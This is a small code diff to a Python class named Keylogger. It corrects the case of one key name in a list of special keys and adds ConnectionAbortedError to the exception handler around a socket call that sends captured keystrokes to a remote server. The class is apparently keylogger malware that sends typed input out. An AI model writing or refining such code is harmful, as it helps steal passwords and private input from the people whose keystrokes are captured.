@@ -19,7 +19,7 @@ class Keylogger():
 
 			"Key.esc", "Key.ctrl", "Key.alt",
 			"Key.shift", "Key.caps_lock", "Key.backspace",
-			"Key.tab", "Key.right", "Key.ctrl_l", "key.alt_l",
+			"Key.tab", "Key.right", "Key.ctrl_l", "Key.alt_l",
 			"Key.cmdr", "Key.cmd"
 
 		]
@@ -67,7 +67,7 @@ class Keylogger():
 						
 						self.client.sendall(byte_msg)
 
-				except (ConnectionResetError, BrokenPipeError):
+				except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
 						
 						print("\nServer has been disconnected")
 
